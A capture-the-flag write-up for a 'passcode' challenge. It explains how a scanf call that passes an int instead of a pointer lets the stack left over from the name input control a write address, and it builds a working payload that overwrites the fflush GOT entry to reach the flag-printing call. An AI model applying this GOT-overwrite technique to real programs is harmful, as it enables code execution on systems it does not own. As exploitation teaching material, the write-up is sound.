# passcode

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
    scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
		printf("Login OK!\n");
		system("/bin/cat flag");
	} else{
		printf("Login Failed!\n");
		exit(0);
	}
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}
```

Traditionally, `scanf` takes two arguments: a format identifier and a pointer to where the write will occur. The program incorrectly implements this libc function

```c
scanf("%d", passcode1);
```

Rather than passing an `int*`, the program passes `int`. Since `scanf` will always write to the address specified, an attacker may be able to control where the write will occur. 

When prompted to "enter your name : " in login, you can write 100 bytes. Then `login` is called reusing the same stack space. You can verify this by writting a pattern into `scanf("%100s", name)` and then look where `passcode1` and `passcode2` are located:

```
gef➤  pattern create 200 (input this into "name")
...
gef➤  x/xw $ebp-0x10     (location of passcode1)
0xffffcd78:     0x61616179
gef➤  pattern offset $ebp-0x10
[+] Searching for '$ebp-0x10'
[+] Found at offset 96 (little-endian search) likely
[+] Found at offset 93 (big-endian search) 
gef➤ 
```

So you can control where you'll write to. Remember than `scanf` writes to **where you are pointing to**. Now you need to find where you want to write to? 

In most cases, when you have an arbitrary write like this, you'll want to overwrite an entry in the GOT. This will give you control of the program + code execution in some cases. How about the GOT entry for `fflush`? 

First, identify what the address is. You can do this by putting the application into Ghidra, but you can also find it in GDB.

```
gef➤  disass login
Dump of assembler code for function login:
   0x08048564 <+0>:     push   ebp
   0x08048565 <+1>:     mov    ebp,esp
   0x08048567 <+3>:     sub    esp,0x28
   0x0804856a <+6>:     mov    eax,0x8048770
   0x0804856f <+11>:    mov    DWORD PTR [esp],eax
   0x08048572 <+14>:    call   0x8048420 <printf@plt>
   0x08048577 <+19>:    mov    eax,0x8048783
   0x0804857c <+24>:    mov    edx,DWORD PTR [ebp-0x10]
   0x0804857f <+27>:    mov    DWORD PTR [esp+0x4],edx
   0x08048583 <+31>:    mov    DWORD PTR [esp],eax
   0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:    mov    eax,ds:0x804a02c
   0x08048590 <+44>:    mov    DWORD PTR [esp],eax
   0x08048593 <+47>:    call   0x8048430 <fflush@plt> <---------- call fflush in plt
   ...<snip>...
gef➤  x/3i 0x8048430
   0x8048430 <fflush@plt>:      jmp    DWORD PTR ds:0x804a004 <-------- jmp fflush in got.plt
   0x8048436 <fflush@plt+6>:    push   0x8
   0x804843b <fflush@plt+11>:   jmp    0x8048410
```

Lets test. Create the payload with `python3 -c "import sys;sys.stdout.buffer.write(b'A' * 96 + b'\x04\xa0\x04\x08')"`

```
gef➤  x/xw $ebp-0x10
0xffffcd78:     0x0804a004
```

Cool. You control where to write now what do you write? Well, the GOT is just a table of addresses to libc. If you overwrite an entry and then call the libc function you effectivly can control where to jump. Traditionally this would be used in a ret2libc where you overwrite an entry in the GOT to say `system`. This would be overkill in this context though. Since the goal is to get to `system("/bin/cat flag")` you can just jump there. 

There are two caveats:
1. You can't just jump to the address that calls `system` (address 0x080485ea) because program still has to set up the call to `system`. Instead, jump to 0x080485e3 which sets up the call.
2. You have to enter decimal and not raw hex. 0x080485e3 = 134514147

You can generate and execute the payload: `python3 -c "import sys;sys.stdout.buffer.write(b'A' * 96 + b'\x04\xa0\x04\x08' + b'134514147')" | ./passcode`